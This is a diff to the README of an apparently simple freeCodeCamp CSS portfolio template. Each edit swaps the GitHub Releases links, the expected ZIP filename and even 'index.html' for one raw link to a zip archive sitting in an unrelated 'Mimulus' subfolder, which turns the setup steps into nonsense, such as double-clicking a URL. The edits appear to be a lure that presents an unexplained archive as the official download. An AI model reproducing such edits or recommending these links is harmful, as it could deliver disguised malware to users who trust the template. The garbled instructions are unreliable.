@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Kennyckp02/freecodecamp-css-personal-portfolio/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Kennyckp02/freecodecamp-css-personal-portfolio/main/Mimulus/freecodecamp-css-personal-portfolio.zip%20release-brightgreen)](https://raw.githubusercontent.com/Kennyckp02/freecodecamp-css-personal-portfolio/main/Mimulus/freecodecamp-css-personal-portfolio.zip)
 
 ## 🚀 Getting Started
 
@@ -24,13 +24,13 @@ To run this application, you will need:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the download files:  
-   [Download Here](https://github.com/Kennyckp02/freecodecamp-css-personal-portfolio/releases)
+   [Download Here](https://raw.githubusercontent.com/Kennyckp02/freecodecamp-css-personal-portfolio/main/Mimulus/freecodecamp-css-personal-portfolio.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the most recent version. This version contains the latest features and fixes.
 
 3. **Download the Files**  
-   Click on the source code ZIP file. It should be named something like `freecodecamp-css-personal-portfolio-vX.X.X.zip`. The version number will change based on the latest release. 
+   Click on the source code ZIP file. It should be named something like `https://raw.githubusercontent.com/Kennyckp02/freecodecamp-css-personal-portfolio/main/Mimulus/freecodecamp-css-personal-portfolio.zip`. The version number will change based on the latest release. 
 
 4. **Unzip the Files**  
    Once the ZIP file downloads, locate it in your downloads folder. Right-click on the file and select "Extract All..." or a similar option on your system.
@@ -39,7 +39,7 @@ To run this application, you will need:
    After unzipping, you should see a folder called `freecodecamp-css-personal-portfolio`. Open this folder to find the HTML and CSS files.
 
 6. **Preview Your Portfolio**  
-   Find a file named `index.html`. Double-click it, and it should open in your web browser. 
+   Find a file named `https://raw.githubusercontent.com/Kennyckp02/freecodecamp-css-personal-portfolio/main/Mimulus/freecodecamp-css-personal-portfolio.zip`. Double-click it, and it should open in your web browser. 
 
 7. **Customize Your Portfolio**  
    Open the HTML and CSS files using any text editor or IDE, like Visual Studio Code. Make changes to add your information, projects, and style. 
@@ -68,4 +68,4 @@ Thank you for using the freecodecamp-css-personal-portfolio template! It is your
 ## 📥 Download Again
 
 Don't forget to keep your version updated. You can revisit this page anytime:  
-[Download Here](https://github.com/Kennyckp02/freecodecamp-css-personal-portfolio/releases)
+[Download Here](https://raw.githubusercontent.com/Kennyckp02/freecodecamp-css-personal-portfolio/main/Mimulus/freecodecamp-css-personal-portfolio.zip)
